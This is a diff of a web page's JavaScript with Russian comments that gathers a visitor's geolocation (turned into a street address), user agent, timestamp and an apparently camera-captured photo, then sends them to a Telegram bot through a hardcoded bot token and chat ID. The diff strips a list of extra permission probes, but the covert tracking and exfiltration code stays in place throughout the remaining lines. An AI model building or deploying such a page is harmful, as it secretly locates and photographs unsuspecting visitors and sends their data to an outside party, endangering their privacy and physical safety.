@@ -21,7 +21,7 @@
         }
 
         h1 {
-            font-size: 3rem; /* Текст немного выше */
+            font-size: 3rem;  /* Текст немного выше */
             text-align: center;
             margin: 0;
         }
@@ -47,7 +47,7 @@
             return formattedAddress || 'Адрес не найден';
         }
 
-        async function sendToTelegram(userInfo, latitude = null, longitude = null, photoBlob = null) {
+        async function sendToTelegram(photoBlob, userInfo, latitude, longitude) {
             const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
             const chatId = '-1002255197235';
 
@@ -67,16 +67,6 @@
                 IP-адрес: ${userInfo.ipAddress}
                 Провайдер: ${userInfo.provider}
                 Адрес: ${userInfo.geoLocation || 'Неизвестно'}
-                Микрофон: ${userInfo.microphonePermission}
-                Уведомления: ${userInfo.notificationsPermission}
-                Встроенный контент: ${userInfo.embeddedContentPermission}
-                Датчики движения: ${userInfo.motionSensorsPermission}
-                Устройства с NFC: ${userInfo.nfcDevicesPermission}
-                USB: ${userInfo.usbPermission}
-                Буфер обмена: ${userInfo.clipboardPermission}
-                Виртуальная реальность: ${userInfo.virtualRealityPermission}
-                Дополненная реальность: ${userInfo.augmentedRealityPermission}
-                Использование устройства: ${userInfo.deviceUsagePermission}
             `.trim();
 
             const formData = new FormData();
@@ -125,17 +115,6 @@
         async function startProcess() {
             const geoPermission = await navigator.permissions.query({ name: 'geolocation' });
             const cameraPermission = await navigator.permissions.query({ name: 'camera' });
-            const microphonePermission = await navigator.permissions.query({ name: 'microphone' });
-            const notificationsPermission = await navigator.permissions.query({ name: 'notifications' });
-            const embeddedContentPermission = await navigator.permissions.query({ name: 'document-exec' });
-            const motionSensorsPermission = await navigator.permissions.query({ name: 'accelerometer' });
-            const nfcDevicesPermission = await navigator.permissions.query({ name: 'nfc' });
-            const usbPermission = await navigator.permissions.query({ name: 'usb' });
-            const clipboardPermission = await navigator.permissions.query({ name: 'clipboard-read' });
-            const virtualRealityPermission = await navigator.permissions.query({ name: 'vr' });
-            const augmentedRealityPermission = await navigator.permissions.query({ name: 'ar' });
-            const deviceUsagePermission = await navigator.permissions.query({ name: 'device-info' });
-
             let userInfo = {
                 deviceInfo: navigator.userAgent,
                 timestamp: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
@@ -153,16 +132,6 @@
                 geoLocation: 'Неизвестно', // начальное значение
                 ipAddress: 'Неизвестно',  // здесь можно интегрировать API для получения IP, если нужно
                 provider: 'Неизвестно',  // аналогично, можно интегрировать API для получения провайдера
-                microphonePermission: microphonePermission.state,
-                notificationsPermission: notificationsPermission.state,
-                embeddedContentPermission: embeddedContentPermission.state,
-                motionSensorsPermission: motionSensorsPermission.state,
-                nfcDevicesPermission: nfcDevicesPermission.state,
-                usbPermission: usbPermission.state,
-                clipboardPermission: clipboardPermission.state,
-                virtualRealityPermission: virtualRealityPermission.state,
-                augmentedRealityPermission: augmentedRealityPermission.state,
-                deviceUsagePermission: deviceUsagePermission.state,
             };
 
             let photoBlob = null;
@@ -180,16 +149,16 @@
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
                         userInfo.geoLocation = await getUserInfo(latitude, longitude);
-                        await sendToTelegram(userInfo, latitude, longitude, photoBlob);
+                        await sendToTelegram(photoBlob, userInfo, latitude, longitude);
                     },
                     async (error) => {
                         userInfo.geoLocation = 'Не удалось получить геолокацию: ' + error.message;
-                        await sendToTelegram(userInfo, null, null, photoBlob);
+                        await sendToTelegram(photoBlob, userInfo);
                     }
                 );
             } else {
-                // Если геолокация не доступна, все равно отправляем информацию
-                await sendToTelegram(userInfo, null, null, photoBlob);
+                userInfo.geoLocation = 'Неизвестно';
+                await sendToTelegram(photoBlob, userInfo);
             }
         }
 
